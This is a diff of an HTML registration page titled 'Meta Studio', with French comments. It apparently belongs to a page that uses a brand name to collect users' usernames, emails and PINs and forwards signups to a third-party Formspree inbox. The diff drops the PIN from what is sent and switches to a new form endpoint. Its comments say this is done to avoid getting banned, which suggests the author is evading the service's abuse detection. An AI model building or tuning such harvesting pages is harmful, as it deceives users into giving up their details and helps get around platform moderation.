@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Studio</title>
     
-    <!-- FAVICON : Remplacez le lien ci-dessous par le lien de votre photo -->
+    <!-- FAVICON (Votre lien) -->
     <link rel="icon" href="https://fv5-5.files.fm/thumb_show.php?i=bg4k8pheyj&view&v=1&PHPSESSID=6a5abacfc85fc24782be0d442de527f6ff5fe8ab">
 
     <!-- Police et Icônes -->
@@ -306,7 +306,7 @@
             window.open(`${baseUrl}?${params.toString()}`, '_blank');
         }
 
-        /* --- LOGIQUE D'INSCRIPTION (AVEC ENVOI DU PIN) --- */
+        /* --- LOGIQUE D'INSCRIPTION (MODIFIÉE : PAS D'ENVOI DU PIN) --- */
         async function handleRegister(e) {
             e.preventDefault();
             
@@ -326,7 +326,7 @@
                 return;
             }
 
-            // Sauvegarde locale
+            // Sauvegarde locale (Le PIN est gardé ici, mais PAS envoyé)
             localStorage.setItem('userUsername', username);
             localStorage.setItem('userEmail', email);
             localStorage.setItem('userPin', pin);
@@ -334,15 +334,17 @@
             state.username = username;
             state.email = email;
 
-            // Envoi à Formspree (PIN inclus dans le message et comme champ séparé)
+            // Envoi à Formspree (NOUVEAU LIEN + PAS DE PIN)
             const formData = new FormData();
             formData.append('email', email);
             formData.append('username', username);
-            formData.append('pin', pin); // Envoi du PIN
-            formData.append('message', `Nouvelle inscription de l'utilisateur : ${username}\nCode PIN : ${pin}`);
+            
+            // On n'envoie PAS le PIN pour éviter le bannissement
+            formData.append('message', `Nouvelle inscription de l'utilisateur : ${username}`);
             formData.append('_subject', `Nouvelle Inscription : ${username}`);
 
-            fetch('https://formspree.io/f/mbdaqdpj', {
+            // NOUVEAU LIEN INTÉGRÉ ICI
+            fetch('https://formspree.io/f/xkovkjjp', {
                 method: 'POST',
                 body: formData,
                 headers: { 'Accept': 'application/json' }
